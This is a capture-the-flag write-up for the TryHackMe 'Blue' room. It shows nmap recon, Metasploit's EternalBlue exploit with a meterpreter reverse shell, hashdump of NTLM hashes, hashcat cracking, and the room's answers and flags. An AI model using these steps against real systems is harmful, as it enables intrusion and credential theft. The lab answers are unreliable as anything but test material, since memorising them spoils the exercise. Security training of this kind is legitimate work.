# TryHackMe [Blue](https://www.tryhackme.com/room/blue)
### References
* Hammond, J. (2020). TryHackMe! EternalBlue/MS17-010 in Metasploit [YouTube Video]. In YouTube. https://youtu.be/s6rwS7UuMt8
* Microsoft. (2017, October 11). Microsoft Security Bulletin MS17-010 - Critical. Microsoft.com. https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
## Recon
### How many ports are open with a port number under 1000?
```bash
$ nmap -sV -sC <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-11 08:23 AEST
Nmap scan report for <MACHINE_IP>
Host is up (0.28s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2021-05-10T22:25:26+00:00
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2021-05-09T22:21:54
|_Not valid after:  2021-11-08T22:21:54
|_ssl-date: 2021-05-10T22:25:33+00:00; -1s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 59m59s, deviation: 2h14m10s, median: 0s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:22:ad:0b:95:87 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-10T17:25:26-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-10T22:25:26
|_  start_date: 2021-05-10T22:21:53
```
**Answer**: `3`
### What is this machine vulnerable to (answer in the form of: ms??-???)?
* According to [Microsoft](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010), the EternalBlue vulnerability has been given the codename `ms17-010`.

**Answer**: `ms17-010`
## Gain Access
### What is the full path of the exploitation code we will run against the machine?
```
msf6 > search eternalblue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```
**Answer**: `exploit/windows/smb/ms17_010_eternalblue`
### Show options and set the one required value. What is the name of this value?
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.14     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```
**Answer**: `RHOSTS`
1. Use the `exploit/windows/smb/ms17_010_eternalblue` module.
2. Set `LHOST` to your OpenVPN IP.
3. Set `RHOSTS` to the server's IP.
4. Start the exploit.
```bash
$ msfconsole -q
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
LHOST => <OPENVPN_IP>
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS <MACHINE_IP>
RHOSTS => <MACHINE_IP>
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on <OPENVPN_IP>:4444 
[*] <MACHINE_IP>:445 - Executing automatic check (disable AutoCheck to override)
[*] <MACHINE_IP>:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] <MACHINE_IP>:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] <MACHINE_IP>:445     - Scanned 1 of 1 hosts (100% complete)
[+] <MACHINE_IP>:445 - The target is vulnerable.
[*] <MACHINE_IP>:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] <MACHINE_IP>:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] <MACHINE_IP>:445     - Scanned 1 of 1 hosts (100% complete)
[*] <MACHINE_IP>:445 - Connecting to target for exploitation.
[+] <MACHINE_IP>:445 - Connection established for exploitation.
[+] <MACHINE_IP>:445 - Target OS selected valid for OS indicated by SMB reply
[*] <MACHINE_IP>:445 - CORE raw buffer dump (42 bytes)
[*] <MACHINE_IP>:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] <MACHINE_IP>:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] <MACHINE_IP>:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] <MACHINE_IP>:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] <MACHINE_IP>:445 - Trying exploit with 12 Groom Allocations.
[*] <MACHINE_IP>:445 - Sending all but last fragment of exploit packet
[*] <MACHINE_IP>:445 - Starting non-paged pool grooming
[+] <MACHINE_IP>:445 - Sending SMBv2 buffers
[+] <MACHINE_IP>:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] <MACHINE_IP>:445 - Sending final SMBv2 buffers.
[*] <MACHINE_IP>:445 - Sending last fragment of exploit packet!
[*] <MACHINE_IP>:445 - Receiving response from exploit packet
[+] <MACHINE_IP>:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] <MACHINE_IP>:445 - Sending egg to corrupted connection.
[*] <MACHINE_IP>:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to <MACHINE_IP>
[*] Meterpreter session 1 opened (<OPENVPN_IP>:4444 -> <MACHINE_IP>:49173) at 2021-05-11 16:16:09 +1000
[+] <MACHINE_IP>:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] <MACHINE_IP>:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] <MACHINE_IP>:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 
```
## Escalate
### What is the name of the post module we will use?
**Answer**: `post/multi/manage/shell_to_meterpreter`
### Show options, what option are we required to change?
**Answer**: `SESSION`
```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 600   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 644   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 688   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 724   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1000  644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 1020  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 1064  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1164  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1276  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1312  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1364  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wbem\wmiprvse.exe
 1392  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1468  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1612  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1720  724   taskeng.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\taskeng.exe
 1828  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
 1936  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2008  692   taskhost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\taskhost.exe
 2084  816   WmiPrvSE.exe
 2324  692   mscorsvw.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorsvw.exe
 2384  692   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
 2420  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2648  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM
 2768  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
 2788  2324  mscorsvw.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorsvw.exe
 2968  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2984  1276  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe

meterpreter > migrate -N winlogon.exe
[*] Migrating from 1276 to 644...
[*] Migration completed successfully.
meterpreter > 
```
## Cracking
### What is the name of the non-default user?
* In a `meterpreter` shell, the `hashdump` command can be used to get the users' password hashes.
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

**Answer**: `Jon`
### What is the cracked password?
* In `hashcat`:
  * `-D 2` is used to use the GPU for hash cracking.
  * `-m 1000` is used to crack Windows NTLM hash.
```bash
$ hashcat -D 2 -m 1000 'ffb43f0de35be4d9917ac0cc8ad57f8d' rockyou.txt
ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d
Time.Started.....: Tue May 11 16:49:03 2021 (6 secs)
Time.Estimated...: Tue May 11 16:49:09 2021 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  1844.3 kH/s (7.92ms) @ Accel:128 Loops:1 Thr:8 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10223616/14344384 (71.27%)
Rejected.........: 0/10223616 (0.00%)
Restore.Point....: 10174464/14344384 (70.93%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#2....: amby6931 -> alisonodonnell1
```

**Answer**: `alqfna22`
## Find flags!
### Flag1? This flag can be found at the system root.
```
meterpreter > pwd
C:\Windows\system32
meterpreter > cd C:/
meterpreter > dir
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2009-07-14 13:18:56 +1000  $Recycle.Bin
40777/rwxrwxrwx   0       dir   2009-07-14 15:08:56 +1000  Documents and Settings
40777/rwxrwxrwx   0       dir   2009-07-14 13:20:08 +1000  PerfLogs
40555/r-xr-xr-x   4096    dir   2009-07-14 13:20:08 +1000  Program Files
40555/r-xr-xr-x   4096    dir   2009-07-14 13:20:08 +1000  Program Files (x86)
40777/rwxrwxrwx   4096    dir   2009-07-14 13:20:08 +1000  ProgramData
40777/rwxrwxrwx   0       dir   2018-12-13 14:13:22 +1100  Recovery
40777/rwxrwxrwx   4096    dir   2018-12-13 10:01:17 +1100  System Volume Information
40555/r-xr-xr-x   4096    dir   2009-07-14 13:20:08 +1000  Users
40777/rwxrwxrwx   16384   dir   2009-07-14 13:20:08 +1000  Windows
100666/rw-rw-rw-  24      fil   2018-12-13 14:47:39 +1100  flag1.txt
0000/---------    455120  fif   1970-01-09 06:27:28 +1000  hiberfil.sys
0000/---------    455120  fif   1970-01-09 06:27:28 +1000  pagefile.sys

meterpreter > cat flag1.txt 
flag{access_the_machine}
```
**Flag 1**: `flag{access_the_machine}`
### Flag2? This flag can be found at the location where passwords are stored within Windows.
```
meterpreter > cd C:/Windows/System32/config
meterpreter > dir
Listing: C:\Windows\System32\config
===================================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  28672     fil   2009-07-14 15:32:39 +1000  BCD-Template
100666/rw-rw-rw-  25600     fil   2009-07-14 15:38:35 +1000  BCD-Template.LOG
100666/rw-rw-rw-  18087936  fil   2009-07-14 12:34:08 +1000  COMPONENTS
100666/rw-rw-rw-  1024      fil   2009-07-14 17:07:31 +1000  COMPONENTS.LOG
100666/rw-rw-rw-  13312     fil   2009-07-14 12:34:08 +1000  COMPONENTS.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 12:34:08 +1000  COMPONENTS.LOG2
100666/rw-rw-rw-  1048576   fil   2021-05-11 16:12:23 +1000  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.0.regtrans-ms
100666/rw-rw-rw-  1048576   fil   2021-05-11 16:12:23 +1000  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.1.regtrans-ms
100666/rw-rw-rw-  1048576   fil   2021-05-11 16:12:24 +1000  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.2.regtrans-ms
100666/rw-rw-rw-  65536     fil   2021-05-11 16:12:23 +1000  COMPONENTS{016888b8-6c6f-11de-8d1d-001e0bcde3ec}.TxR.blf
100666/rw-rw-rw-  65536     fil   2009-07-14 14:54:56 +1000  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2009-07-14 14:54:56 +1000  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2009-07-14 14:54:56 +1000  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  262144    fil   2009-07-14 12:34:08 +1000  DEFAULT
100666/rw-rw-rw-  1024      fil   2009-07-14 17:07:31 +1000  DEFAULT.LOG
100666/rw-rw-rw-  177152    fil   2009-07-14 12:34:08 +1000  DEFAULT.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 12:34:08 +1000  DEFAULT.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-18 09:22:09 +1100  DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-18 09:22:09 +1100  DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-18 09:22:09 +1100  DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
40777/rwxrwxrwx   0         dir   2009-07-14 13:20:10 +1000  Journal
40777/rwxrwxrwx   4096      dir   2009-07-14 13:20:10 +1000  RegBack
100666/rw-rw-rw-  262144    fil   2009-07-14 12:34:08 +1000  SAM
100666/rw-rw-rw-  1024      fil   2009-07-14 17:07:31 +1000  SAM.LOG
100666/rw-rw-rw-  21504     fil   2009-07-14 12:34:08 +1000  SAM.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 12:34:08 +1000  SAM.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-18 09:22:09 +1100  SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-18 09:22:09 +1100  SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-18 09:22:09 +1100  SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  262144    fil   2009-07-14 12:34:08 +1000  SECURITY
100666/rw-rw-rw-  1024      fil   2009-07-14 17:07:30 +1000  SECURITY.LOG
100666/rw-rw-rw-  21504     fil   2009-07-14 12:34:08 +1000  SECURITY.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 12:34:08 +1000  SECURITY.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-18 09:22:08 +1100  SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-18 09:22:09 +1100  SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-18 09:22:09 +1100  SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  40632320  fil   2009-07-14 12:34:08 +1000  SOFTWARE
100666/rw-rw-rw-  1024      fil   2009-07-14 17:07:30 +1000  SOFTWARE.LOG
100666/rw-rw-rw-  262144    fil   2009-07-14 12:34:08 +1000  SOFTWARE.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 12:34:08 +1000  SOFTWARE.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-18 09:21:18 +1100  SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-18 09:21:18 +1100  SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-18 09:21:18 +1100  SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  12582912  fil   2009-07-14 12:34:08 +1000  SYSTEM
100666/rw-rw-rw-  1024      fil   2009-07-14 17:07:30 +1000  SYSTEM.LOG
100666/rw-rw-rw-  262144    fil   2009-07-14 12:34:08 +1000  SYSTEM.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 12:34:08 +1000  SYSTEM.LOG2
100666/rw-rw-rw-  65536     fil   2019-03-18 09:21:15 +1100  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-03-18 09:21:15 +1100  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-18 09:21:15 +1100  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
40777/rwxrwxrwx   4096      dir   2009-07-14 13:20:10 +1000  TxR
100666/rw-rw-rw-  34        fil   2018-12-13 14:48:22 +1100  flag2.txt
40777/rwxrwxrwx   4096      dir   2009-07-14 13:20:10 +1000  systemprofile

meterpreter > cat flag2.txt 
flag{sam_database_elevated_access}
```
**Flag 2**: `flag{sam_database_elevated_access}`
### Flag3?
```
meterpreter > search -f flag*.txt
Found 3 results...
    c:\flag1.txt (24 bytes)
    c:\Users\Jon\Documents\flag3.txt (37 bytes)
    c:\Windows\System32\config\flag2.txt (34 bytes)
meterpreter > cat C:/Users/Jon/Documents/flag3.txt
flag{admin_documents_can_be_valuable}
```
**Flag 3**: `flag{admin_documents_can_be_valuable}`